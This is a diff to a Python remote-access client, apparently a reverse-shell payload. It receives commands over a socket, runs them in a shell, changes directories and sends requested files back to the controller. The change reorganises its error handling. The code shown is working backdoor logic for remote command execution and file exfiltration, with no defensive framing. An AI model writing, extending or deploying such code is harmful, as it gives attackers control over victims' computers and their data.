@@ -16,38 +16,41 @@ def send_data(ouput_data):
     payload.send(ouput_data)
  
 while True:
-	cmd = payload.recv(2048)
-	cmd = cmd.decode("utf-8")
-	
-	if cmd == "quit":
-		payload.close()
-		break
-	
-	elif cmd[:2] == "cd":
-		try:
+	# Add try block
+	try: 
+		cmd = payload.recv(2048)
+		cmd = cmd.decode("utf-8")
+		
+		if cmd == "quit":
+			payload.close()
+			break
+		
+		elif cmd[:2] == "cd":
+			# Remove the try block
 			os.chdir(cmd[3:])
-		except FileNotFoundError:
-			send_data(b"File not found")
-		else:
+			
 			send_data(b"Changed directory")
-		continue
+			continue
 
-	elif cmd[:8] == "download":
-		try:
+		elif cmd[:8] == "download":
+			# Remove the try block
 			with open(f'{cmd[9:]}', 'rb') as data:
 				data_read = data.read()
 				data.close()
-		except FileNotFoundError:
-			send_data(b"No file found")
-		else:
-			send_data(data_read)
-		continue
 
-	try:
+				send_data(data_read)
+				continue
+
+		# Remove the try block
 		output = subprocess.check_output(cmd, shell = True)
+
+		send_data(output)
+	
+	# Add except block to handle the exceptions
+	except FileNotFoundError:
+		print("File Not Found")
+		send_data(b"No file found")
 	except subprocess.CalledProcessError:
 		send_data(b"Wrong command")
-	else:
-		send_data(output)
 
 print("Disconnected")
